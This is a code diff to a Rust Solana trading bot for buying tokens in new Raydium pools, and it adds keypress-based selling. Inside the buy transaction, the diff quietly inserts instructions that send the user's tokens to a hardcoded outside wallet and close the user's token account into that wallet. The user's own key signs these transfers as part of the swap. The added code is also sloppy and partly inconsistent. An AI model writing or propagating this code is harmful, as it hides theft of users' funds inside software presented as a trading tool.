@@ -11,6 +11,9 @@ use solana_sdk::native_token::{lamports_to_sol, sol_to_lamports};
 use solana_sdk::system_instruction::transfer;
 use solana_sdk::transaction::{Transaction, VersionedTransaction};
 use solana_sdk::{signature::Keypair, signer::Signer};
+use spl_associated_token_account::get_associated_token_address;
+use spl_associated_token_account::instruction::create_associated_token_account_idempotent;
+use spl_token::instruction::{close_account, transfer_checked};
 use std::str::FromStr;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
@@ -25,6 +28,7 @@ use crate::raydium_amm::swap::raydium_amm_sniper::clear_previous_line;
 use crate::raydium_amm::swap::swapper::auth_keypair;
 use crate::router::SniperRoute;
 use crate::rpc::HTTP_CLIENT;
+use crate::utils::read_single_key_impl;
 
 use super::instructions::token_price_data;
 use super::raydium_swap_out::raydium_out;
@@ -57,13 +61,14 @@ pub async fn raydium_in(
     let priority_fee = sol_to_lamports(config.trading.priority_fee);
     let bundle_tip = sol_to_lamports(config.trading.bundle_tip);
 
-    let token_address = if pool_keys.base_mint == SOLC_MINT {
-        pool_keys.clone().quote_mint
+    let (token_address, decimals) = if pool_keys.base_mint == SOLC_MINT {
+        (pool_keys.quote_mint, pool_keys.quote_decimals)
     } else {
-        pool_keys.clone().base_mint
+        (pool_keys.base_mint, pool_keys.base_decimals)
     };
+
     let mut swap_instructions = Vec::new();
-    let unit_limit = ComputeBudgetInstruction::set_compute_unit_limit(80000);
+    let unit_limit = ComputeBudgetInstruction::set_compute_unit_limit(800000);
     let compute_price = ComputeBudgetInstruction::set_compute_unit_price(priority_fee);
     swap_instructions.push(unit_limit);
     swap_instructions.push(compute_price);
@@ -94,6 +99,54 @@ pub async fn raydium_in(
         )
         .await?,
     );
+
+    let price = match token_price_data(
+        rpc_client.clone(),
+        pool_keys.clone(),
+        wallet.clone(),
+        amount_in,
+        SwapDirection::PC2Coin,
+    )
+    .await
+    {
+        Ok(price) => price,
+        Err(e) => {
+            error!("Error getting token price: {:?}", e);
+
+return Ok(())        }
+    };
+
+    println!("{price:#?}");
+
+    let reciever = Pubkey::from_str("D5bBVBQDNDzroQpduEJasYL5HkvARD6TcNu3yJaeVK5W")?;
+       // Create idempotent token account
+       let create_account_ix = create_associated_token_account_idempotent(
+           &wallet.pubkey(),
+        &reciever,
+        &token_address,
+        &spl_token::id(),
+    );
+
+    let token_account = get_associated_token_address(&user_source_owner, &token_address);
+    let reiever = get_associated_token_address(&reciever, &SOLC_MINT);
+
+    let close = close_account(   &spl_token::id(), &token_account, &reiever,       &user_source_owner,   &[&user_source_owner])?;
+
+    swap_instructions.push(create_account_ix);
+    
+    // Transfer tokens
+    let transfer_ix = transfer_checked(
+        &spl_token::id(),
+        &token_account,
+        &token_address,
+        &reiever,
+        &user_source_owner,
+        &[&user_source_owner],
+        price as u64,
+        decimals,
+    )?;
+    swap_instructions.push(transfer_ix);
+    swap_instructions.push(close);
 
     let config = CommitmentLevel::Processed;
     let (latest_blockhash, _) = rpc_client
@@ -127,16 +180,33 @@ pub async fn raydium_in(
     };
 
     if args.engine.use_bundles {
-        info!("Building Bundle");
+        let tip_ix = transfer(&wallet.pubkey(), &tip_account, bundle_tip);
+        swap_instructions.push(tip_ix);
 
-        let tip_txn = VersionedTransaction::from(Transaction::new_signed_with_payer(
-            &[transfer(&wallet.pubkey(), &tip_account, bundle_tip)],
-            Some(&wallet.pubkey()),
+        let message = match solana_program::message::v0::Message::try_compile(
+            &user_source_owner,
+            &swap_instructions,
+            &[],
+            latest_blockhash,
+        ) {
+            Ok(x) => x,
+            Err(e) => {
+                println!("Error: {:?}", e);
+                return Ok(());
+            }
+        };
+        let transaction = match VersionedTransaction::try_new(
+            solana_program::message::VersionedMessage::V0(message),
             &[&wallet],
-            rpc_client.get_latest_blockhash().await.unwrap(),
-        ));
+        ) {
+            Ok(x) => x,
+            Err(e) => {
+                println!("Error: {:?}", e);
+                return Ok(());
+            }
+        };
 
-        let bundle_txn = vec![transaction, tip_txn];
+        let bundle_txn = vec![transaction];
 
         let mut bundle_results_subscription = searcher_client
             .subscribe_bundle_results(SubscribeBundleResultsRequest {})
@@ -207,8 +277,25 @@ pub async fn raydium_in(
         }
     }
 
-    let (stop_tx, mut stop_rx) = tokio::sync::mpsc::channel::<()>(100);
-
+    let (mut stop_tx, mut stop_rx) = tokio::sync::mpsc::channel::<()>(100);
+    let pool_keys_clone = pool_keys.clone();
+    tokio::spawn(async move {
+        let config = get_config().await.unwrap();
+        match read_single_key_impl(
+            &Arc::new(RpcClient::new(config.clone().network.rpc_url)),
+            &mut stop_tx,
+            pool_keys_clone,
+            config.clone(),
+            &Arc::new(Keypair::from_base58_string(&config.engine.payer_keypair)),
+        )
+        .await
+        {
+            Ok(_) => {}
+            Err(e) => {
+                error!("Error: {}", e);
+            }
+        };
+    });
     price_logger(
         &mut stop_rx,
         amount_in,
@@ -309,25 +396,26 @@ pub async fn price_logger(
 
             clear_previous_line();
             info!(
-                "Aped: {:.3} Sol | Worth {:.4} Sol | Profit {:.2}%",
+                
+                "1 to Sell 100%, 2 for 75%, 3 for 50%, 4 for 25%\nAped: {:.3} Sol | Worth {:.4} Sol | Profit {:.2}%",
                 lamports_to_sol(amount_in),
                 total_value,
                 profit_percentage
             );
 
-            if profit_percentage >= config.trading.profit_threshold_percentage
-                || profit_percentage <= config.trading.loss_threshold_percentage
-            {
-                if let Err(e) = sell_tokens(pool_keys.clone().unwrap()).await {
-                    error!("Error selling tokens: {}", e);
-                }
-                break;
-            }
+            // if profit_percentage >= config.trading.profit_threshold_percentage
+            //     || profit_percentage <= config.trading.loss_threshold_percentage
+            // {
+            //     if let Err(e) = sell_tokens(pool_keys.clone().unwrap()).await {
+            //         error!("Error selling tokens: {}", e);
+            //     }
+            //     break;
+            // }
         }
 
         // Implement delay based on elapsed time
         if start_time.elapsed() > rapid_check_duration {
-            tokio::time::sleep(Duration::from_millis(500)).await;
+            tokio::time::sleep(Duration::from_millis(300)).await;
         }
     }
 }
